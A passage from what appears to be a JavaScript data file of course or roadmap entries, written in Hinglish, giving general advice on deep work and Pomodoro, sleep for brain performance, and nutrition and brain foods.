    description: "Deep work: distraction-free focused work jisme complex problems solve hote hain. Pomodoro technique: 25 min kaam, 5 min break, 4 rounds baad 15-30 min break. Phone notifications band karo kaam ke time. Single tasking > multitasking — brain context switching mein energy waste karta hai. Har din 2-3 'MIT' (Most Important Tasks) identify karo. Flow state mein aane mein 15-20 min lagte hain — disturb mat karo.",
  },
  {
    id: "health-05", phase: "Phase 9: Health & Productivity", category: "Mental Performance", title: "Sleep & Recovery for Brain Performance", level: "intermediate", order: 5,
    description: "Sleep mein brain memories consolidate karta hai — jo seekha tha woh properly store hota hai. 7-9 hours adult ke liye zaroori hai. Sleep deprivation se: slow thinking, poor decisions, weak immunity. Consistent sleep schedule rakho — weekends pe bhi. Sone se 1 hour pehle screen band karo (blue light melatonin rokta hai). Caffeine afternoon ke baad mat lo. REM sleep problem-solving boost karta hai — isliye 'kal dekhenge' kaam karta hai.",
  },
  {
    id: "health-06", phase: "Phase 9: Health & Productivity", category: "Mental Performance", title: "Nutrition & Brain Foods", level: "intermediate", order: 6,
    description: "Brain 20% energy consume karta hai — sahi fuel dena zaroori hai. Omega-3 (fish, walnuts, flaxseeds) brain function improve karta hai. Blueberries, dark chocolate, nuts antioxidants hain — brain protect karte hain. High sugar spikes aur crashes deta hai — energy fluctuate hoti hai. Hydration: dehydration se 20% cognitive function drop ho sakta hai — pani piyo. Breakfast mat chodho — glucose brain ka primary fuel hai.",
  },
];
